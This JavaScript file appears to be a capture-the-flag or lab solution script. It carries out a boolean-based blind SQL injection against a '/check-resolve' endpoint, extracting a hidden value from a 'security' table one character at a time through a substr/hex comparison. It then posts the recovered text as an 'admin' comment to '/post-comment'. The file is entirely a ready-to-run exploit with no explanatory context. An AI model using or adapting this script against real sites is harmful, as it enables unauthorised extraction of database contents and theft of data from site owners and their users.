// Base information
const url = '/check-resolve';
const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'; // Include all ASCII characters
let discovered_content = '';

// Function to check if a character is correct
function checkCharacter(position, character) {
  const data = new URLSearchParams({
    id: `1 and (SELECT hex(substr(content,${position},1)) FROM security WHERE id = 6) = hex('${character}')`
  });
  return fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: data
  })
  .then(response => response.text())
  .then(text => {
    if (text.includes("Done")) { // Assuming "Done" indicates success
      discovered_content += character;
      console.log(`Found char at position ${position}: ${character}`);
      return true; // Correct character found
    }
    return false; // Incorrect character, continue searching
  });
}

// Function to send the discovered content
function postDiscoveredContent() {
  const postData = new URLSearchParams({
    comment2: discovered_content,
    "comment-author": "admin"
  });

  return fetch("/post-comment", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: postData
  })
  .then(response => response.text()) // Assuming response is text
  .then(text => {
    console.log('Discovered content was successfully posted.');
  })
  .catch(error => {
    console.error('Failed to post discovered content:', error);
  });
}

// Main function to find the content
async function findContent() {
  let content_length = 20; // Adjust based on expected length
  for (let position = 1; position <= content_length; position++) {
    let found_char = false;
    for (const char of characters) {
      const found = await checkCharacter(position, char);
      if (found) {
        found_char = true;
        break; // Move to the next character position
      }
    }
    if (!found_char) {
      console.log(`Character at position ${position} not found, assuming end of content.`);
      break; // Assume end of content if no character is found for the current position
    }
  }
  console.log(`Discovered content: ${discovered_content}`);
  postDiscoveredContent(); // Post the discovered content once it is fully discovered
}

// Start the process
findContent();
